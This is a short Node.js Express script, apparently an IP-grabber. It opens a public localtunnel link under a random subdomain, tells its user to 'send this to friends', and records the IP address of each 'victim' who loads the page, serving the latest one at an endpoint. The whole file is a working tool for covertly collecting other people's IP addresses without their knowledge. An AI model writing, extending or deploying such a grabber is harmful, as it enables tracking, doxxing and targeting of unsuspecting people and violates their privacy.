const express = require("express");
const app = express();
const http = require("http");
const server = http.createServer(app);
const requestIp = require("request-ip");
const localtunnel = require("localtunnel");
const fetch = require("node-fetch");


app.use(requestIp.mw());

const randomURL = async ()=> {
    let mening = "";
    for (let i = 0; i < 3; i++) {
        const req = await fetch.default("https://random-word-api.herokuapp.com/word");
        const res = await req.json();
        mening += res[0];
        
    }
    return mening;
}


const startTunnel = async () => {
    let sub = await randomURL()
    const tunnel = await localtunnel({port: 3000, subdomain: sub});
    console.log("Send this to friends: " + tunnel.url);
    console.log("Open this to see victims ip address: " + tunnel.url + "/log");
};

startTunnel();

let latestIP = "";

app.set('trust proxy', true);
app.use(express.static("public"));

app.get('/ip', (req, res) => {
    res.json({ ip: latestIP });
});

app.get('/info', (req, res) => {
    latestIP = req.clientIp;
    console.log("New IP address recieved: " + latestIP);
})

server.listen(3000);